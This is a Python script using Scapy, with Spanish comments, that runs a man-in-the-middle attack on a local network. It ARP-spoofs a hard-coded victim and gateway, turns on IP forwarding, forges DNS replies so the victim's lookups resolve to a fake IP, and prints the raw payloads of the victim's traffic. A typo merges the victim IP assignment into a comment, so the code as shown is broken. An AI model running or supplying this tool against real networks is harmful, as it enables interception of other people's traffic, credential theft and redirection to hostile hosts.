from scapy.all import ARP, IP, UDP, DNS, DNSQR, DNSRR, send, sniff, sr, Raw, AsyncSniffer
import os
import sys
import threading
import time

# Configuración de IPsictim_ip = "192.168.9.70"  # IP de la víctima
gateway_ip = "192.168.0.28"  # IP del router
fake_dns_ip = "192.168.1.50"   # IP falsa para respuestas DNS

# Habilita el reenvío de paquetes en Linux
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Reenvío IP activado.")

# Obtiene la MAC de una IP mediante ARP request
def get_mac(ip):
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False)
    for _, r in ans:
        return r.hwsrc
    return None

# Envía un ARP reply (spoofing)
def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    send(arp_response, verbose=False)

# Restaura ARP enviando la tabla correcta
def restore_arp(v_ip, v_mac, g_ip, g_mac):
    # Restaurar en víctima
    send(ARP(op=2, pdst=v_ip, psrc=g_ip, hwdst=v_mac, hwsrc=g_mac), count=5, verbose=False)
    # Restaurar en gateway
    send(ARP(op=2, pdst=g_ip, psrc=v_ip, hwdst=g_mac, hwsrc=v_mac), count=5, verbose=False)

# Función de DNS spoofing
def dns_spoof(packet):
    if packet.haslayer(DNSQR) and packet[IP].src == victim_ip:
        spoofed = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
            DNS(
                id=packet[DNS].id,
                qr=1, aa=1,
                qd=packet[DNS].qd,
                an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=fake_dns_ip)
            )
        )
        send(spoofed, verbose=False)
        print(f"[+] DNS spoof enviado a {packet[IP].src} para {packet[DNSQR].qname.decode()}")

# Función para imprimir payload de paquetes no DNS
def payload_sniff(packet):
    if Raw in packet and packet[IP].src == victim_ip:
        try:
            data = packet[Raw].load
            print(f"[+] Paquete de {packet[IP].src} -> {packet[IP].dst}: {repr(data)}")
        except Exception:
            pass

# Lanza sniffers DNS y genérico en paralelo
def start_sniffers():
    dns_sniffer = AsyncSniffer(
        filter=f"udp port 53 and src host {victim_ip}",
        prn=dns_spoof,
        store=False
    )
    general_sniffer = AsyncSniffer(
        filter=f"host {victim_ip}",
        prn=payload_sniff,
        store=False
    )
    dns_sniffer.start()
    general_sniffer.start()
    dns_sniffer.join()
    general_sniffer.join()

# Bucle de ARP spoofing continuo
def spoof_loop():
    try:
        while True:
            arp_spoof(victim_ip, gateway_ip)
            arp_spoof(gateway_ip, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restaurando tablas ARP...")
        v_mac = get_mac(victim_ip)
        g_mac = get_mac(gateway_ip)
        if v_mac and g_mac:
            restore_arp(victim_ip, v_mac, gateway_ip, g_mac)
        print("[+] ARP restaurado. Saliendo.")
        sys.exit(0)

# Ejecución principal
if __name__ == "__main__":
    enable_ip_forwarding()
    print("[*] Iniciando ARP spoofing y sniffing...")
    threading.Thread(target=spoof_loop, daemon=True).start()
    start_sniffers()
